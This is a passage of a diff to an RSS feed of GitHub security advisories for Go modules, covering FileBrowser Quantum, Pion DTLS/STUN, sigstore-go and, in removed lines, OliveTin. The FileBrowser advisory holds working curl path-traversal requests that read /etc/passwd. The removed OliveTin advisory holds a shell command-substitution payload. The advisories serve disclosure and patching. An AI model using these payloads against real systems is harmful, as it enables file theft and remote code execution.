@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-31T21:55:33.639Z</updated>
+    <updated>2026-07-31T22:50:46.889Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,272 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gtsteffaniak/filebrowser/backend] FileBrowser Quantum's path traversal issue in subtitle handler allows any authenticated user to read arbitrary files]]></title>
+        <id>https://github.com/advisories/GHSA-vvp7-h4fj-m28w</id>
+        <link href="https://github.com/advisories/GHSA-vvp7-h4fj-m28w"/>
+        <updated>2026-07-31T22:37:03.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>subtitlesHandler</code> endpoint (<code>GET /api/media/subtitles</code>) accepts two user-controlled query parameters: <code>path</code> and <code>name</code>, both of which are used in filesystem operations without sanitization, creating two independent path traversal vectors.</p>
+<p>The primary vector is the <code>path</code> parameter: it is passed directly to <code>idx.GetRealPath()</code> without calling <code>SanitizeUserPath()</code>, allowing an attacker to escape the storage root and set <code>parentDir</code> to any directory on the host. No existing anchor file is required. </p>
+<p>The secondary vector is the <code>name</code> parameter: it is joined with <code>parentDir</code> via <code>filepath.Join(parentDir, name)</code> without stripping directory components, allowing traversal relative to any resolved <code>parentDir</code>.</p>
+<p>Any authenticated user (regardless of role or permissions) can exploit either vector to read any text file readable by the server process, including <code>/etc/passwd</code>, SSH keys, database credentials, and JWT signing keys.</p>
+<h3 id="details">Details</h3>
+<p><strong>1. <code>path</code> parameter lacks <code>SanitizeUserPath()</code> — primary vector (<code>http/media.go:54</code>)</strong></p>
+<pre><code class="language-go">userscope, err := d.user.GetScopeForSourceName(source)
+// ...
+realPath, _, err := idx.GetRealPath(userscope, path)  // path is raw user input, no sanitization
+// ...
+parentDir := filepath.Dir(realPath)  // line 59: attacker controls this directory
+</code></pre>
+<p><code>SanitizeUserPath()</code> explicitly rejects <code>..</code> segments:</p>
+<pre><code class="language-go">func SanitizeUserPath(userPath string) (string, error) {
+    // ...
+    for _, segment := range segments {
+        if segment == ".." {
+            return "", fmt.Errorf("invalid path: path traversal detected")
+        }
+    }
+    // ...
+}
+</code></pre>
+<p>Every other handler in the codebase calls <code>SanitizeUserPath()</code> before <code>GetRealPath()</code>. This handler skips it, so <code>path=../../etc/passwd</code> resolves <code>parentDir</code> to <code>/etc</code>, with no anchor file required.</p>
+<p><strong>2. <code>name</code> parameter used directly in <code>filepath.Join</code> — secondary vector (<code>http/media.go:63</code>)</strong></p>
+<pre><code class="language-go">name := r.URL.Query().Get("name")  // line 37 — raw user input
+// ...
+content, err = utils.GetSubtitleSidecarContent(
+    filepath.Join(parentDir, name))  // line 63 — TRAVERSAL
+</code></pre>
+<p><code>filepath.Join(parentDir, "../../etc/passwd")</code> resolves the <code>..</code> components, escaping <code>parentDir</code>. This vector requires a valid file in scope as the <code>path</code> anchor.</p>
+<p><strong>3. <code>GetSubtitleSidecarContent</code> reads and returns file contents (<code>common/utils/media.go:17-43</code>)</strong></p>
+<pre><code class="language-go">func GetSubtitleSidecarContent(subtitlePath string) (string, error) {
+    info, err := os.Stat(subtitlePath)        // follows the traversed path
+    // size check: &lt; 50MB
+    isText, err := IsTextFile(subtitlePath)   // checks UTF-8 validity
+    content, err := os.ReadFile(subtitlePath) // reads and returns content
+    return string(content), nil
+}
+</code></pre>
+<p>The only constraint is that the target file must be UTF-8 valid and under 50MB. Binary files silently return an empty string.</p>
+<p><strong>4. Endpoint is behind <code>withUser</code> but requires no special permissions</strong></p>
+<pre><code class="language-go">// httpRouter.go
+api.HandleFunc("GET /media/subtitles", withUser(subtitlesHandler))
+</code></pre>
+<p>Any authenticated user can access this endpoint: no admin, modify, share, or download permission is required.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Vector 1: <code>path</code> traversal (no anchor file needed):</strong></p>
+<pre><code class="language-bash">docker run -d --name filebrowser-q-lab -p 18080:80 gtstef/filebrowser:latest &amp;&amp; sleep 3
+TOKEN=$(curl -s -X POST "http://localhost:18080/api/auth/login?username=admin" -H "X-Password: admin" | tr -d '"')
+curl "http://localhost:18080/api/media/subtitles?path=../../etc/passwd&amp;source=srv&amp;name=passwd&amp;embedded=false&amp;auth=$TOKEN"
+</code></pre>
+<p><strong>Expected output:</strong> <code>/etc/passwd</code> contents with HTTP 200.</p>
+<p><strong>Vector 2: <code>name</code> traversal (anchor file required):</strong></p>
+<pre><code class="language-bash">mkdir -p /tmp/fbq-srv &amp;&amp; echo "dummy" &gt; /tmp/fbq-srv/poc.txt
+docker run -d --name filebrowser-q-lab2 -p 18081:80 -v /tmp/fbq-srv:/srv gtstef/filebrowser:latest &amp;&amp; sleep 3
+TOKEN=$(curl -s -X POST "http://localhost:18081/api/auth/login?username=admin" -H "X-Password: admin" | tr -d '"')
+curl "http://localhost:18081/api/media/subtitles?path=/poc.txt&amp;source=srv&amp;name=../../etc/passwd&amp;embedded=false&amp;auth=$TOKEN"
+</code></pre>
+<p><strong>Expected output:</strong> <code>/etc/passwd</code> contents with HTTP 200.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Arbitrary file read</strong>: Any authenticated user can read any text file on the host filesystem that the server process has read permission for.</li>
+<li><strong>No anchor file required</strong>: The <code>path</code> vector works on a default install with an empty storage root, so no existing file in scope is needed.</li>
+<li><strong>Scope bypass</strong>: Scoped users (restricted to a subdirectory) can escape their scope via either vector and access files belonging to other users or the host system.</li>
+<li><strong>Credential exposure</strong>: <code>/etc/passwd</code>, <code>/etc/shadow</code> (if running as root), SSH private keys, application configuration files with database passwords, API keys, and JWT signing secrets.</li>
+<li><strong>Privilege escalation</strong>: Reading the JWT signing key from the database or config file enables forging admin tokens.</li>
+<li><strong>No special permissions required</strong>: The endpoint only requires basic authentication: no admin, modify, share, or download permissions.</li>
+</ul>
+<h3 id="recommended-fix">Recommended Fix</h3>
+<p>Apply <code>SanitizeUserPath()</code> to the <code>path</code> parameter and <code>filepath.Base()</code> to the <code>name</code> parameter:</p>
+<pre><code class="language-go">// http/media.go, subtitlesHandler
+
+// Sanitize path parameter (like all other handlers)
+path, err := utils.SanitizeUserPath(path)
+if err != nil {
+    return http.StatusBadRequest, err
+}
+
+// Strip directory components from name to prevent traversal
+name = filepath.Base(name)
+</code></pre>
+<p><code>SanitizeUserPath()</code> rejects any <code>..</code> segment. <code>filepath.Base("../../etc/passwd")</code> returns <code>"passwd"</code>, preventing traversal via <code>name</code>. Additionally, consider adding a file extension allowlist to restrict <code>name</code> to subtitle formats (<code>.srt</code>, <code>.vtt</code>, <code>.ass</code>, <code>.ssa</code>, <code>.sub</code>) only.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-vvp7-h4fj-m28w">https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-vvp7-h4fj-m28w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54910">https://nvd.nist.gov/vuln/detail/CVE-2026-54910</a></li>
+<li><a href="https://github.com/gtsteffaniak/filebrowser/pull/2524">https://github.com/gtsteffaniak/filebrowser/pull/2524</a></li>
+<li><a href="https://github.com/gtsteffaniak/filebrowser/commit/f3f4bbe80cb569d664174aea874d7bfa008c3b5a">https://github.com/gtsteffaniak/filebrowser/commit/f3f4bbe80cb569d664174aea874d7bfa008c3b5a</a></li>
+<li><a href="https://github.com/gtsteffaniak/filebrowser/releases/tag/v1.4.3-beta">https://github.com/gtsteffaniak/filebrowser/releases/tag/v1.4.3-beta</a></li>
+<li><a href="https://github.com/advisories/GHSA-vvp7-h4fj-m28w">https://github.com/advisories/GHSA-vvp7-h4fj-m28w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vvp7-h4fj-m28w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-31T22:35:05.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/pion/dtls/v3] Pion DTLS vulnerable to denial of service via panic while parsing a crafted ECDHE_PSK ServerKeyExchange message]]></title>
+        <id>https://github.com/advisories/GHSA-wg4g-wm44-ch5j</id>
+        <link href="https://github.com/advisories/GHSA-wg4g-wm44-ch5j"/>
+        <updated>2026-07-31T22:06:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Remote denial of service via panic while parsing a crafted ECDHE_PSK ServerKeyExchange message.</p>
+<h3 id="patches">Patches</h3>
+<p>Upgrade to v3.1.4 or later. This version includes this patch <a href="https://github.com/pion/dtls/pull/839">https://github.com/pion/dtls/pull/839</a> which fixes the issue.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No work around; please upgrade to v3.1.4 or a newer version.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pion/dtls/security/advisories/GHSA-wg4g-wm44-ch5j">https://github.com/pion/dtls/security/advisories/GHSA-wg4g-wm44-ch5j</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54908">https://nvd.nist.gov/vuln/detail/CVE-2026-54908</a></li>
+<li><a href="https://github.com/pion/dtls/pull/839">https://github.com/pion/dtls/pull/839</a></li>
+<li><a href="https://github.com/pion/dtls/commit/49458d604a4f3ebce1bf9587a0f3e5f3f6b4a55e">https://github.com/pion/dtls/commit/49458d604a4f3ebce1bf9587a0f3e5f3f6b4a55e</a></li>
+<li><a href="https://github.com/pion/dtls/releases/tag/v3.1.3">https://github.com/pion/dtls/releases/tag/v3.1.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-wg4g-wm44-ch5j">https://github.com/advisories/GHSA-wg4g-wm44-ch5j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wg4g-wm44-ch5j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T22:06:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/pion/stun] Pion STUN vulnerable to remote denial of service via panic while parsing a malformed XOR-MAPPED-ADDRESS attribute]]></title>
+        <id>https://github.com/advisories/GHSA-34rh-wp3j-6cxc</id>
+        <link href="https://github.com/advisories/GHSA-34rh-wp3j-6cxc"/>
+        <updated>2026-07-31T22:03:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Remote denial of service via panic while parsing a malformed XOR-MAPPED-ADDRESS attribute</p>
+<h3 id="patches">Patches</h3>
+<p>Upgrade to v3.1.5 or later. This version includes this patch <a href="https://github.com/pion/stun/pull/278">https://github.com/pion/stun/pull/278</a> which fixes the issue.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No work around; please upgrade to v3.1.5 or a newer version.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pion/stun/security/advisories/GHSA-34rh-wp3j-6cxc">https://github.com/pion/stun/security/advisories/GHSA-34rh-wp3j-6cxc</a></li>
+<li><a href="https://github.com/pion/stun/pull/278">https://github.com/pion/stun/pull/278</a></li>
+<li><a href="https://github.com/pion/stun/commit/fa9f074a33a8059c76c960b1fbee39f308002423">https://github.com/pion/stun/commit/fa9f074a33a8059c76c960b1fbee39f308002423</a></li>
+<li><a href="https://github.com/pion/stun/releases/tag/v3.1.3">https://github.com/pion/stun/releases/tag/v3.1.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-34rh-wp3j-6cxc">https://github.com/advisories/GHSA-34rh-wp3j-6cxc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-34rh-wp3j-6cxc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T22:03:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/pion/stun/v2] Pion STUN vulnerable to remote denial of service via panic while parsing a malformed XOR-MAPPED-ADDRESS attribute]]></title>
+        <id>https://github.com/advisories/GHSA-34rh-wp3j-6cxc</id>
+        <link href="https://github.com/advisories/GHSA-34rh-wp3j-6cxc"/>
+        <updated>2026-07-31T22:03:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Remote denial of service via panic while parsing a malformed XOR-MAPPED-ADDRESS attribute</p>
+<h3 id="patches">Patches</h3>
+<p>Upgrade to v3.1.5 or later. This version includes this patch <a href="https://github.com/pion/stun/pull/278">https://github.com/pion/stun/pull/278</a> which fixes the issue.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No work around; please upgrade to v3.1.5 or a newer version.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pion/stun/security/advisories/GHSA-34rh-wp3j-6cxc">https://github.com/pion/stun/security/advisories/GHSA-34rh-wp3j-6cxc</a></li>
+<li><a href="https://github.com/pion/stun/pull/278">https://github.com/pion/stun/pull/278</a></li>
+<li><a href="https://github.com/pion/stun/commit/fa9f074a33a8059c76c960b1fbee39f308002423">https://github.com/pion/stun/commit/fa9f074a33a8059c76c960b1fbee39f308002423</a></li>
+<li><a href="https://github.com/pion/stun/releases/tag/v3.1.3">https://github.com/pion/stun/releases/tag/v3.1.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-34rh-wp3j-6cxc">https://github.com/advisories/GHSA-34rh-wp3j-6cxc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-34rh-wp3j-6cxc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T22:03:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/pion/stun/v3] Pion STUN vulnerable to remote denial of service via panic while parsing a malformed XOR-MAPPED-ADDRESS attribute]]></title>
+        <id>https://github.com/advisories/GHSA-34rh-wp3j-6cxc</id>
+        <link href="https://github.com/advisories/GHSA-34rh-wp3j-6cxc"/>
+        <updated>2026-07-31T22:03:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Remote denial of service via panic while parsing a malformed XOR-MAPPED-ADDRESS attribute</p>
+<h3 id="patches">Patches</h3>
+<p>Upgrade to v3.1.5 or later. This version includes this patch <a href="https://github.com/pion/stun/pull/278">https://github.com/pion/stun/pull/278</a> which fixes the issue.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No work around; please upgrade to v3.1.5 or a newer version.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pion/stun/security/advisories/GHSA-34rh-wp3j-6cxc">https://github.com/pion/stun/security/advisories/GHSA-34rh-wp3j-6cxc</a></li>
+<li><a href="https://github.com/pion/stun/pull/278">https://github.com/pion/stun/pull/278</a></li>
+<li><a href="https://github.com/pion/stun/commit/fa9f074a33a8059c76c960b1fbee39f308002423">https://github.com/pion/stun/commit/fa9f074a33a8059c76c960b1fbee39f308002423</a></li>
+<li><a href="https://github.com/pion/stun/releases/tag/v3.1.3">https://github.com/pion/stun/releases/tag/v3.1.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-34rh-wp3j-6cxc">https://github.com/advisories/GHSA-34rh-wp3j-6cxc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-34rh-wp3j-6cxc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T22:03:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/sigstore/sigstore-go] sigstore-go fails to check signature timestamps against a signing key's validity period]]></title>
+        <id>https://github.com/advisories/GHSA-wqqc-jjcq-vfxm</id>
+        <link href="https://github.com/advisories/GHSA-wqqc-jjcq-vfxm"/>
+        <updated>2026-07-31T21:58:40.000Z</updated>
+        <content type="html"><![CDATA[<p>sigstore-go fails to check signature timestamps against a signing key's validity period for self-managed long-lived keys without certificates.</p>
+<h2 id="impact">Impact</h2>
+<p>To verify a bundle with a self-managed long-lived key, the key needs to be wrapped in an <code>ExpiringKey</code> type that implies expiration semantics:</p>
+<pre><code class="language-go">signatureVerifier, _ := signature.LoadDefaultVerifier(publicKey)
+expiredKey := root.NewExpiringKey(signatureVerifier, time.Unix(0, 0), time.Unix(1, 0))
+</code></pre>
+<p>Despite the API contract, the validator does not check the bundle signing time against the validity window. Attackers that obtain expired key materials may be able to sign bundles with those materials that are accepted despite a configured expiry date. This issue only impacts the long-lived signing key workflow, and not standard deployments involving a certificate authority.</p>
+<h2 id="reproduction-steps">Reproduction steps</h2>
+<p>Start from a sigstore-go checkout:</p>
+<pre><code class="language-bash">git clone https://github.com/sigstore/sigstore-go.git
+cd sigstore-go
+git checkout 8ca80c47ef03d26ebf174db7c296700b075b2c16
+</code></pre>
+<p>Apply the <a href="https://github.com/user-attachments/files/28614520/sigstore-go-public-key-validity-test.patch">patch</a> containing the test case and associated materials:</p>
+<pre><code class="language-bash">git apply sigstore-go-public-key-validity-test.patch
+</code></pre>
+<p>Run the test:</p>
+<pre><code class="language-bash">go test ./pkg/verify -run TestPublicKeyValidityCheckedAgainstSignedTimestamp
+</code></pre>
+<p>On vulnerable code, the test fails because verification succeeds even though the trusted <code>ExpiringKey</code> is not valid at the signed timestamp:</p>
+<pre><code class="language-text">--- FAIL: TestPublicKeyValidityCheckedAgainstSignedTimestamp
+    signed_entity_test.go:602:
+            Error:      	An error is expected but got nil.
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sigstore/sigstore-go/security/advisories/GHSA-wqqc-jjcq-vfxm">https://github.com/sigstore/sigstore-go/security/advisories/GHSA-wqqc-jjcq-vfxm</a></li>
+<li><a href="https://github.com/sigstore/sigstore-go/pull/642">https://github.com/sigstore/sigstore-go/pull/642</a></li>
+<li><a href="https://github.com/sigstore/sigstore-go/commit/4594ab4c779d08be1f4419803a8249188f35ed5f">https://github.com/sigstore/sigstore-go/commit/4594ab4c779d08be1f4419803a8249188f35ed5f</a></li>
+<li><a href="https://github.com/sigstore/sigstore-go/releases/tag/v1.2.1">https://github.com/sigstore/sigstore-go/releases/tag/v1.2.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-wqqc-jjcq-vfxm">https://github.com/advisories/GHSA-wqqc-jjcq-vfxm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wqqc-jjcq-vfxm</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-31T21:58:39.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/free5gc/ausf] free5GC AUSF: null byte injection in supiOrSuci causes HTTP 500 internal service failure]]></title>
         <id>https://github.com/advisories/GHSA-qj55-47fp-p62j</id>
@@ -987,637 +1253,5 @@ Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-09T09:32:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/OliveTin/OliveTin] OliveTin OS Command Injection via Custom regex: Argument Type Bypassing Shell Safety Check]]></title>
-        <id>https://github.com/advisories/GHSA-xc5w-4v5w-7x65</id>
-        <link href="https://github.com/advisories/GHSA-xc5w-4v5w-7x65"/>
-        <updated>2026-07-30T14:31:15.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>OliveTin's checkShellArgumentSafety() function maintains a blocklist of argument types unsafe for Shell mode actions, but does not include regex:-prefixed types. Because regex: support was added independently via typeSafetyCheckRegex(), any Shell mode action using a regex:-typed argument bypasses the safety check unconditionally. The unvalidated value is then interpolated directly into the sh -c command string via Go's text/template with no escaping, enabling shell injection. Notably, even restrictive-looking patterns are exploitable — for example, a pattern blocking common shell metacharacters remains bypassable via POSIX command substitution.</p>
-<h3 id="details">Details</h3>
-<p>OliveTin is an open source web UI for running pre-configured shell commands. In the OliveTin service component, the function checkShellArgumentSafety() in service/internal/executor/arguments.go enforces a blocklist of argument types that are unsafe for use in Shell mode actions (actions that execute via sh -c). The blocklist includes password, very_dangerous_raw_string, url, email, and raw_string_multiline. It does not handle custom regex: prefixed argument types.</p>
-<p>Custom regex: types are supported by a separate function, typeSafetyCheckRegex(), which checks whether a submitted value matches the provided pattern. These two functions evolved independently: when regex: prefix support was added to typeSafetyCheckRegex, checkShellArgumentSafety was not updated to treat regex: types as unsafe for Shell mode. As a result, any action configured with a Shell mode handler and a regex:-typed argument passes the safety check unconditionally, regardless of how permissive or restrictive the pattern is.</p>
-<p>The argument value then reaches handleShellBranch → wrapCommandInShell, where Go's text/template interpolates it directly into the sh -c command string with no escaping.</p>
-<p>Critically, this vulnerability is not limited to obviously permissive patterns like regex:.*. An admin who writes a restrictive-looking pattern such as regex: ^[^;|&amp;&lt;&gt;]+$ - explicitly blocking the five most common shell injection characters (semicolon, pipe, ampersand, both redirects) — is still fully exploitable via POSIX command substitution.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Deploy OliveTin</li>
-</ol>
-<pre><code class="language-bash">docker run -d --name olivetin-poc -p 1337:1337 \
-  -v /tmp/olivetin-poc/config:/config \
-  ghcr.io/olivetin/olivetin:3000.11.3
-</code></pre>
-<ol start="2">
-<li>Write the configuration below as /tmp/olivetin-poc/config/config.yaml , which represents a realistic admin-authored action: a Shell mode command that accepts user-supplied input validated by a custom regex pattern.</li>
-</ol>
-<pre><code class="language-yaml">actions:
-  - title: Custom Input Action
-    id: custom_input
-    shell: echo "Input was {{ .Arguments.customInput }}"
-    arguments:
-      - name: customInput
-        type: "regex:^[^;|&amp;&lt;&gt;]+$"
-        title: Custom Input
-</code></pre>
-<ol start="3">
-<li>Trigger RCE via command substitution.</li>
-</ol>
-<pre><code class="language-bash">curl -s -X POST http://localhost:1337/api/v1/StartAction \
-  -H "Content-Type: application/json" \
-  -d '{"bindingId":"custom_input","arguments":[{"name":"customInput","value":"$(touch /tmp/rce_proof)"}]}'
-</code></pre>
-<ol start="4">
-<li>Now verify RCE by checking presence of file</li>
-</ol>
-<pre><code class="language-bash">docker exec olivetin-poc ls -la /tmp/rce_proof
-</code></pre>
-<img width="1533" height="319" alt="olivetin_proof" src="https://github.com/user-attachments/assets/82c9cc50-8f05-41f8-8cee-bceb3d4b3a2d">
-
-
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated attacker with network access to an OliveTin instance can achieve full OS command injection - and in practice remote code execution — as the OliveTin process user, provided a Shell mode action exists with any regex:-typed argument whose pattern permits $, backtick, or parentheses.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xc5w-4v5w-7x65">https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xc5w-4v5w-7x65</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67438">https://nvd.nist.gov/vuln/detail/CVE-2026-67438</a></li>
-<li><a href="https://github.com/OliveTin/OliveTin/commit/995ff79736f2bccc364448a3ece84087b550b232">https://github.com/OliveTin/OliveTin/commit/995ff79736f2bccc364448a3ece84087b550b232</a></li>
-<li><a href="https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0">https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-xc5w-4v5w-7x65">https://github.com/advisories/GHSA-xc5w-4v5w-7x65</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xc5w-4v5w-7x65</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-30T14:31:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/OliveTin/OliveTin] OliveTin: StartActionAndWait Endpoints Bypass `logs` Permission and Return Action Output]]></title>
-        <id>https://github.com/advisories/GHSA-jm28-2wcr-qf3h</id>
-        <link href="https://github.com/advisories/GHSA-jm28-2wcr-qf3h"/>
-        <updated>2026-07-30T14:25:21.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The synchronous execution RPCs <code>StartActionAndWait</code> and <code>StartActionByGetAndWait</code> return the full <code>LogEntry</code> for the just-executed action without checking whether the caller is allowed to read that action's logs.</p>
-<p>OliveTin's ACL model separates <code>exec</code> from <code>logs</code>. A deployment can intentionally allow a user to run an action while denying access to its historical or live output. That separation is enforced in <code>GetLogs</code>, <code>GetActionLogs</code>, <code>ExecutionStatus</code>, and <code>EventStream</code>, but it is not enforced in the synchronous <code>...AndWait</code> endpoints.</p>
-<p>As a result, any user who can execute an action through these endpoints can read the action output immediately even when the action's ACL explicitly sets <code>logs:false</code>.</p>
-<h2 id="details">Details</h2>
-<p>OliveTin defines separate per-action permissions:</p>
-<pre><code class="language-go">// service/internal/config/config.go
-type PermissionsList struct {
-    View bool `koanf:"view"`
-    Exec bool `koanf:"exec"`
-    Logs bool `koanf:"logs"`
-    Kill bool `koanf:"kill"`
-}
-</code></pre>
-<p>The normal log and streaming paths correctly enforce <code>logs</code> permission:</p>
-<pre><code class="language-go">// service/internal/api/api.go
-func (api *oliveTinAPI) isLogEntryAllowed(e *executor.InternalLogEntry, user *authpublic.AuthenticatedUser) bool {
-    if user == nil || !isValidLogEntry(e) {
-        return false
-    }
-    return acl.IsAllowedLogs(api.cfg, user, e.Binding.Action)
-}
-</code></pre>
-<p>That check is used by:</p>
-<ul>
-<li><code>GetLogs</code></li>
-<li><code>GetActionLogs</code></li>
-<li><code>ExecutionStatus</code></li>
-<li><code>EventStream</code></li>
-</ul>
-<p>However, the synchronous execution endpoints directly return the created <code>LogEntry</code> without any <code>logs</code> ACL check:</p>
-<pre><code class="language-go">// service/internal/api/api.go
-func (api *oliveTinAPI) StartActionAndWait(ctx ctx.Context, req *connect.Request[apiv1.StartActionAndWaitRequest]) (*connect.Response[apiv1.StartActionAndWaitResponse], error) {
-    ...
-    internalLogEntry, ok := api.startActionAndWaitRun(binding, args, user)
-    if !ok {
-        return nil, connect.NewError(connect.CodeNotFound, fmt.Errorf("execution not found"))
-    }
-    return connect.NewResponse(&amp;apiv1.StartActionAndWaitResponse{
-        LogEntry: api.internalLogEntryToPb(internalLogEntry, user),
-    }), nil
-}
-
-func (api *oliveTinAPI) StartActionByGetAndWait(ctx ctx.Context, req *connect.Request[apiv1.StartActionByGetAndWaitRequest]) (*connect.Response[apiv1.StartActionByGetAndWaitResponse], error) {
-    ...
-    internalLogEntry, ok := api.executor.GetLog(execReq.TrackingID)
-    if ok {
-        return connect.NewResponse(&amp;apiv1.StartActionByGetAndWaitResponse{
-            LogEntry: api.internalLogEntryToPb(internalLogEntry, user),
-        }), nil
-    }
-    return nil, connect.NewError(connect.CodeNotFound, fmt.Errorf("execution not found"))
-}
-</code></pre>
-<p>And <code>internalLogEntryToPb()</code> includes the full output:</p>
-<pre><code class="language-go">// service/internal/api/api.go
-func (api *oliveTinAPI) internalLogEntryToPb(logEntry *executor.InternalLogEntry, authenticatedUser *authpublic.AuthenticatedUser) *apiv1.LogEntry {
-    pble := &amp;apiv1.LogEntry{
-        ActionTitle:         logEntry.ActionTitle,
-        Output:              logEntry.Output,
-        ExitCode:            logEntry.ExitCode,
-        ExecutionTrackingId: logEntry.ExecutionTrackingID,
-        ...
-    }
-    ...
-    return pble
-}
-</code></pre>
-<p>The executor separately enforces <code>exec</code> permission, but there is no subsequent check that the response should omit or deny <code>Output</code> when <code>logs:false</code>.</p>
-<h2 id="local-reproduction">Local Reproduction</h2>
-<p>I verified this locally with a one-off test against the real <code>StartActionAndWait</code> handler.</p>
-<p>Configuration used:</p>
-<ul>
-<li>action <code>secret_action</code> with shell <code>echo SECRET_FROM_ACTION</code></li>
-<li>user <code>low</code> matched by ACL:<ul>
-<li><code>exec: true</code></li>
-<li><code>logs: false</code></li>
-<li><code>view: false</code></li>
-<li><code>kill: false</code></li>
-</ul>
-</li>
-</ul>
-<p>Then I invoked <code>StartActionAndWait</code> as <code>low</code> through the real handler path using header-based auth.</p>
-<p>Observed output from the test run:</p>
-<pre><code class="language-text">=== RUN   TestTempStartActionAndWaitLeaksOutputWithoutLogsPermission
-time="2026-03-12T23:36:33+01:00" level=info msg="Action requested" actionTitle=secret-action tags="[]"
-time="2026-03-12T23:36:33+01:00" level=info msg="Action parse args - Before" actionTitle=secret-action cmd="echo SECRET_FROM_ACTION"
-time="2026-03-12T23:36:33+01:00" level=info msg="Action parse args - After" actionTitle=secret-action cmd="echo SECRET_FROM_ACTION"
-time="2026-03-12T23:36:33+01:00" level=info msg="Action started" actionTitle=secret-action timeout=5
-time="2026-03-12T23:36:33+01:00" level=info msg="Action finished" actionTitle=secret-action exit=0 outputLength=40 timedOut=false
-    temp_acl_bypass_test.go:56: output="S\x00E\x00C\x00R\x00E\x00T\x00_\x00F\x00R\x00O\x00M\x00_\x00A\x00C\x00T\x00I\x00O\x00N\x00\r\x00\n\x00" blocked=false action="secret-action"
---- PASS: TestTempStartActionAndWaitLeaksOutputWithoutLogsPermission (0.03s)
